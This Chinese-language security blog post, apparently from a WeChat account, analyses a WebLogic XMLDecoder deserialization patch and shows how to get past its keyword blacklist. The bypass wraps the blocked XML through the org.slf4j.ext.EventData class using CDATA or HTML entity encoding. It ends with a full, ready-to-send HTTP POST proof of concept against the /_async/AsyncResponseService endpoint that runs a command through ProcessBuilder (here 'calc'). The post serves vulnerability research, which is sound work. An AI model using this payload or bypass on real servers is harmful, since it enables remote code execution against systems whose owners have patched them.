> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/LOGvLr_FLB2ddTFgmiosYQ)

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb64ZtgHYiac20ny2grO9vCyl366iay4K5ERNs7f0qlStzkgkUkclSLaL6U69L4640RRJicU97VuFUfQg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/7QRTvkK2qC5BBRiccicQkicWD6n2u8JzHItRdz6v3aT1CtLryat1lBwGv3QiaOHgGXFqaNpCiaTvanXwKr8tbBrYvxw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/7QRTvkK2qC5BBRiccicQkicWD6n2u8JzHItRdz6v3aT1CtLryat1lBwGv3QiaOHgGXFqaNpCiaTvanXwKr8tbBrYvxw/640?wx_fmt=png)

前言

在对大佬们高版本的 POC 进行分析后，我把重点放在了如何绕过黑名单限制上，那么利用 XML 可以解析的其它编码格式尝试一下绕过。

![](https://mmbiz.qpic.cn/mmbiz_png/7QRTvkK2qC5BBRiccicQkicWD6n2u8JzHItRdz6v3aT1CtLryat1lBwGv3QiaOHgGXFqaNpCiaTvanXwKr8tbBrYvxw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/7QRTvkK2qC5BBRiccicQkicWD6n2u8JzHItRdz6v3aT1CtLryat1lBwGv3QiaOHgGXFqaNpCiaTvanXwKr8tbBrYvxw/640?wx_fmt=png)

补丁回顾

首先回顾一下这个经典的补丁截图，摘自：

http://www.sd.edu.cn/info/1011/1131.htm

![](https://mmbiz.qpic.cn/mmbiz_jpg/Ok4fxxCpBb64ZtgHYiac20ny2grO9vCylvgWPsqH3YZHKZmBvscaDublNNV83ufUzEeZ1gnyfLQEZN6jYoIIicLA/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_jpg/Ok4fxxCpBb64ZtgHYiac20ny2grO9vCylZero09CWFOphp6S5Nxg2SsOYGzOoQzgEsk0R9LNkjJA431d8OUu9eA/640?wx_fmt=jpeg)

可以看到对 object、new、method 关键字做了限制，而且对于 array 数组的长度也做了限制，不得大于 10000。

![](https://mmbiz.qpic.cn/mmbiz_png/7QRTvkK2qC5BBRiccicQkicWD6n2u8JzHItRdz6v3aT1CtLryat1lBwGv3QiaOHgGXFqaNpCiaTvanXwKr8tbBrYvxw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/7QRTvkK2qC5BBRiccicQkicWD6n2u8JzHItRdz6v3aT1CtLryat1lBwGv3QiaOHgGXFqaNpCiaTvanXwKr8tbBrYvxw/640?wx_fmt=png)

高版本 POC 分析

现在网上也公开了 12.1.3 版本的 POC，利用 org.slf4j.ext.EventData 类进行反序列化操作，这个类的构造方法如下：

![](https://mmbiz.qpic.cn/mmbiz_jpg/Ok4fxxCpBb64ZtgHYiac20ny2grO9vCyl5ediaWecc3xsrWc9Z8y0lTpz9FODgYAFd24zoSd76PCkyTVIbMV95JQ/640?wx_fmt=jpeg)

可以看到这个类需要接收一个 XML 的字符串，那么 POC 构造如下：

![](https://mmbiz.qpic.cn/mmbiz_jpg/Ok4fxxCpBb64ZtgHYiac20ny2grO9vCylCXDa9PdPIZqS3zFKwLgVWUicjzGNIjY2dNST8KRfmtgJ4Z1QoQ8HdLQ/640?wx_fmt=jpeg)

那前面也看到了补丁限制了一些关键字，而需要解析的 XML 恰好含有这些关键字，绕过的思路就是整个的 XML 字段真的当作一个字符串传入，CDATA 包含的字符串正好可以作为 XML 文本去解析。

![](https://mmbiz.qpic.cn/mmbiz_png/7QRTvkK2qC5BBRiccicQkicWD6n2u8JzHItRdz6v3aT1CtLryat1lBwGv3QiaOHgGXFqaNpCiaTvanXwKr8tbBrYvxw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/7QRTvkK2qC5BBRiccicQkicWD6n2u8JzHItRdz6v3aT1CtLryat1lBwGv3QiaOHgGXFqaNpCiaTvanXwKr8tbBrYvxw/640?wx_fmt=png)

绕过思路扩展

说到这里大家可能就明白了，只要是 XML 能够解析的编码格式都可以一试，此时想起了前不久看到的《WAF Bypass 之 xerces 解析》，这篇文章对 XML 的解析格式进行了分析，其中一种简便快捷的方式就是 HTML 实体编码，欸，讨巧了，直接尝试将 org.slf4j.ext.EventData 类的构造参数用实体编码传入试一下：

![](https://mmbiz.qpic.cn/mmbiz_jpg/Ok4fxxCpBb64ZtgHYiac20ny2grO9vCyl8Jbiadkxs89s55c7SJMNVQkrfASyA3zWbfkVdC7nzEXOBDcEZic8AYbw/640?wx_fmt=jpeg)

很快啊，计算器啪地一下就弹出来了

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb64ZtgHYiac20ny2grO9vCylPz5wuD4jro6HWeusZ7252LOicoSCHFR9xaZxzRAsHEe0oV77nZ6KiakQ/640?wx_fmt=png)

POC 如下：

```
POST /_async/AsyncResponseService HTTP/1.1
Host: 192.168.188.130:7001
Accept-Encoding: gzip, deflate
SOAPAction:
Accept: /
User-Agent: Apache-HttpClient/4.1.1 (java 1.5)
Connection: keep-alive
content-type: text/xml
Content-Length: 1946

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService"> <soapenv:Header> <wsa:Action>xx</wsa:Action><wsa:RelatesTo>xx</wsa:RelatesTo> <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">

<java><class><string>org.slf4j.ext.EventData</string><void><string><java version="1.8.0_131" class="java.beans.XMLDecoder"><object class="java.lang.ProcessBuilder"><array class="java.lang.String" length="1"><void index="0"><string>calc</string></void></array><void method="start" /></object></java></string>
</void></class>
</java>
</work:WorkContext>
</soapenv:Header> <soapenv:Body><asy:onAsyncDelivery/></soapenv:Body></soapenv:Envelope>

```

![](https://mmbiz.qpic.cn/mmbiz_png/7QRTvkK2qC5BBRiccicQkicWD6n2u8JzHItRdz6v3aT1CtLryat1lBwGv3QiaOHgGXFqaNpCiaTvanXwKr8tbBrYvxw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/7QRTvkK2qC5BBRiccicQkicWD6n2u8JzHItRdz6v3aT1CtLryat1lBwGv3QiaOHgGXFqaNpCiaTvanXwKr8tbBrYvxw/640?wx_fmt=png)

总结

应该还有其它的编码绕过，希望有时间去搞吧。

![](https://mmbiz.qpic.cn/mmbiz_png/7QRTvkK2qC5BBRiccicQkicWD6n2u8JzHItRdz6v3aT1CtLryat1lBwGv3QiaOHgGXFqaNpCiaTvanXwKr8tbBrYvxw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/7QRTvkK2qC5BBRiccicQkicWD6n2u8JzHItRdz6v3aT1CtLryat1lBwGv3QiaOHgGXFqaNpCiaTvanXwKr8tbBrYvxw/640?wx_fmt=png)

参考链接

https://blog.csdn.net/weixin_30408739/article/details/99877655  
https://xz.aliyun.com/t/7116  
https://www.anquanke.com/post/id/209826  
http://www.sd.edu.cn/info/1011/1131.htm

（点击 “阅读原文” 查看链接）

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb6OLwHohYU7UjX5anusw3ZzxxUKM0Ert9iaakSvib40glppuwsWytjDfiaFx1T25gsIWL5c8c7kicamxw/640?wx_fmt=png)
----------------------------------------------------------------------------------------------------------------------------------------------

  

- End -  

精彩推荐

[Apache Flink CVE-2020-17518/17519 漏洞分析](http://mp.weixin.qq.com/s?__biz=MzA5ODA0NDE2MA==&mid=2649738409&idx=1&sn=8910884f83f3b266e3f828efb88eccbb&chksm=888cfcc6bffb75d0aea5a577b39f08efb13d3ae934087d62d1ba593453d14dbf9a21f66d5c57&scene=21#wechat_redirect)  

[关公面前耍大刀？利用色情反向链接威胁网站运营商](http://mp.weixin.qq.com/s?__biz=MzA5ODA0NDE2MA==&mid=2649738345&idx=1&sn=01d46373a51e0e9de09eec667ff9757e&chksm=888cfc06bffb75103c2f315b42803d28abf1798516ae19046bc2e2ade61ad9b4192e4a2bcaf5&scene=21#wechat_redirect)  

[SolarLeaks 网站声称将出售 SolarWinds 攻击中的被盗数据](http://mp.weixin.qq.com/s?__biz=MzA5ODA0NDE2MA==&mid=2649738349&idx=1&sn=e1c39c7eaf6c0a4d54dc55bd50b159b3&chksm=888cfc02bffb75140badb8fc1977f6480ee485717e1dcd824b34b1c580ce081936f4f04b2dfc&scene=21#wechat_redirect)  

[Google CTF justintime](http://mp.weixin.qq.com/s?__biz=MzA5ODA0NDE2MA==&mid=2649738334&idx=1&sn=eaff208e8c52894078702b66665239f7&chksm=888cfc31bffb75279e5637f831f507d9d606f975d3cc34343e044e35d757ce054ce95eea71f3&scene=21#wechat_redirect)

  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ok4fxxCpBb5ZMeq0JBK8AOH3CVMApDrPvnibHjxDDT1mY2ic8ABv6zWUDq0VxcQ128rL7lxiaQrE1oTmjqInO89xA/640?wx_fmt=gif)  

---------------------------------------------------------------------------------------------------------------------------------------------------

**戳 “阅读原文” 查看更多内容**